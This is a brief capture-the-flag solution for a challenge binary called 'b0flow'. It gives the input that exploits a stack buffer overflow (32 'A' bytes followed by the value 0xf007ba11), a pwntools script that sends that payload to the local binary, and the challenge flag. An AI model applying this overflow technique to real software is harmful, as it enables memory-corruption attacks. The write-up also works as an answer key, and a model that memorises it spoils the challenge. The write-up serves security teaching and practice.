
#### Solution
To solve the challenge the participants need to write the code "Solution.py" or need to input bytes data of ( 32 * "A" + "\x11\xba\x07\xf0" ) 

```python
#!/usr/bin/python3
from pwn import *

io= process('./b0flow')
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode(),end="")
print(io.recvline().decode())
io.sendlineafter(b'>',b'A'*32 + p32(0xf007ba11))

print(io.recvall().decode())
```
#### Flag
SLAY{Buff3r_bu573r_g33k}
